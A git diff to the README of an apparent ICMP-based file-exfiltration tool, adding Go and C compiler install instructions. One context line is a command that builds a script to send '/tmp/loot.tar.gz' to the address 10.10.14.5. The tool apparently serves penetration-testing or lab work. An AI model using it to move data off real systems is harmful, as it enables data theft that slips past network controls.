@@ -206,6 +206,49 @@ node generated_ping_f_transfer.js
 
 Go is only available with `makefile`. It generates `.go` source code that must be compiled. Requires `--create-script-for` to specify the target OS.
 
+### Installing Go
+
+<details>
+<summary>Via package manager</summary>
+
+```bash
+# Debian / Ubuntu / Kali
+sudo apt install golang
+
+# Arch
+sudo pacman -S go
+
+# macOS
+brew install go
+```
+
+</details>
+
+<details>
+<summary>Manual installation (from the official Go page)</summary>
+
+Download the latest version from [https://go.dev/dl/](https://go.dev/dl/) and install:
+
+```bash
+# Download (replace version as needed)
+wget https://go.dev/dl/go1.24.3.linux-amd64.tar.gz
+
+# Remove any previous installation and extract
+sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.3.linux-amd64.tar.gz
+
+# Add to PATH (add this line to ~/.bashrc or ~/.zshrc to make it permanent)
+export PATH=$PATH:/usr/local/go/bin
+
+# Verify
+go version
+```
+
+See [https://go.dev/doc/install](https://go.dev/doc/install) for full instructions.
+
+</details>
+
+### Examples
+
 ```bash
 # For Linux
 ping-f-transfer makefile -f '/tmp/loot.tar.gz' -i 10.10.14.5 -l go --create-script-for linux
@@ -252,6 +295,28 @@ Go produces statically linked binaries by default.
 ## C
 
 C is only available with `makefile`. It generates `.c` source code with self-contained AES-CBC, SHA-256, and PBKDF2 implementations (no external crypto libraries needed). Requires `--create-script-for` to specify the target OS.
+
+### Installing a C compiler
+
+| Target OS | What you need | Install command (Debian/Ubuntu/Kali) |
+|---|---|---|
+| Linux | `gcc` | `sudo apt install gcc` (usually pre-installed) |
+| macOS | Xcode Command Line Tools | `xcode-select --install` (on macOS itself) |
+| Windows (cross-compile from Linux) | `gcc-mingw-w64-x86-64` | `sudo apt install gcc-mingw-w64-x86-64` |
+
+```bash
+# Install everything at once on Debian / Ubuntu / Kali
+sudo apt install gcc gcc-mingw-w64-x86-64
+```
+
+If using `--compress`, you also need the zlib development headers:
+
+| Target OS | Package | Install command |
+|---|---|---|
+| Linux | `zlib1g-dev` | `sudo apt install zlib1g-dev` (usually pre-installed) |
+| Windows (cross-compile) | `libz-mingw-w64-dev` | `sudo apt install libz-mingw-w64-dev` |
+
+### Examples
 
 ```bash
 # For Linux (built with -static for portability)
